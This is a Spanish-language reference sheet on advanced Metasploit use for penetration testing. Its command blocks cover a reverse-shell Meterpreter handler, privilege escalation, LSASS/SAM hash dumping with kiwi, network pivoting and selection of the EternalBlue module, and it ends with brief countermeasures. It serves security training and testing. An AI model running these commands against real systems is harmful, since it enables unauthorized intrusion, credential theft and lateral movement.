# Metasploit Framework: Uso Avanzado y Automatización

## Descripción
Metasploit Framework (MSF) es el entorno de desarrollo y ejecución de exploits más utilizado del mundo. Su arquitectura modular permite desde el escaneo de vulnerabilidades hasta la post-explotación avanzada. El dominio avanzado de MSF implica el uso de la base de datos para gestionar objetivos, la automatización mediante archivos de recursos (.rc) y la manipulación de sesiones Meterpreter para el movimiento lateral y la persistencia en redes comprometidas.

## Clasificación
- **Fase**: Análisis de Vulnerabilidades, Explotación, Post-Explotación
- **MITRE ATT&CK**: T1595.002 (Active Scanning); T1210 (Exploitation of Remote Services); T1059 (Command and Scripting Interpreter)
- **Plataforma**: Multi
- **Dificultad**: Intermedia

## Herramientas
- **msfconsole** — Interfaz de línea de comandos principal de Metasploit.
- **msfvenom** — Generador de payloads personalizados con encoders para evasión de firmas.
- **Meterpreter** — Payload de post-explotación avanzado que reside en memoria y permite comandos de sistema, red y archivos.
- **db_connect** — Conexión a base de datos PostgreSQL para almacenar resultados de escaneos y hosts.
- **msfpc** — Herramienta rápida para generar comandos de MSFVenom de forma interactiva.

## Comandos / Ejemplos

### Gestión de Base de Datos y Workspaces
El uso de bases de datos permite segmentar auditorías por cliente o red.
```bash
# Inicializar y verificar conexión (fuera de msfconsole)
systemctl start postgresql && msfdb init
# Crear y listar workspaces
msf6 > workspace -a Proyecto_Alpha
msf6 > workspace
# Importar resultados de Nmap
msf6 > db_import /ruta/al/archivo_nmap.xml
# Listar hosts y servicios encontrados
msf6 > hosts
msf6 > services -p 445 --up
```

### Automatización con Archivos de Recurso (.rc)
Permite ejecutar secuencias de comandos predefinidas, ideal para configuraciones repetitivas.
```bash
# Ejemplo de archivo 'config.rc'
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.2
set LPORT 4444
set ExitOnSession false
run -j

# Ejecutar desde consola
msf6 > resource config.rc
```

### Post-Explotación Avanzada con Meterpreter
Acciones sobre una sesión activa para escalar privilegios o movernos lateralmente.
```bash
# Obtener información del sistema y privilegios
meterpreter > sysinfo
meterpreter > getprivs
# Intentar elevar privilegios automáticamente
meterpreter > getsystem
# Volcar hashes de contraseñas de la memoria (LSASS)
meterpreter > load kiwi
meterpreter > lsa_dump_sam
# Pivoting: Enrutar tráfico a través de la sesión comprometida
meterpreter > run autoroute -s 10.0.1.0/24
```

### Búsqueda y Filtrado de Módulos
```bash
# Buscar exploits para una plataforma específica con ranking 'excellent'
msf6 > search type:exploit platform:windows rank:excellent smb
# Usar el módulo y configurar opciones sugeridas
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options
```

## Contramedidas
- Mantener los sistemas actualizados (patching) para invalidar exploits conocidos en el repositorio de MSF.
- Utilizar soluciones EDR/AV avanzadas que detecten el comportamiento de Meterpreter en memoria.
- Restringir la comunicación entre subredes para limitar el impacto del pivoting de red.

## Referencias
- Rahalkar, S. (2017). *Metasploit for Beginners*. Packt Publishing.
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1210: Exploitation of Remote Services. https://attack.mitre.org/techniques/T1210/
